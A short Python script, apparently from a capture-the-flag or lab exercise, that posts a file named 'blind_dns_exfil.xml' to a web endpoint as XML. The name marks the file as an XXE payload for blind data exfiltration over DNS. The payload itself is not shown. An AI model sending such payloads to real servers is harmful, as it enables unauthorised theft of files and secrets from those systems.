import requests

with open("blind_dns_exfil.xml", "r") as f:
    data = f.read()


r = requests.post("https://kaketyv.no/hello", headers={'Content-Type': "application/xml"}, data=data)

print(r.text)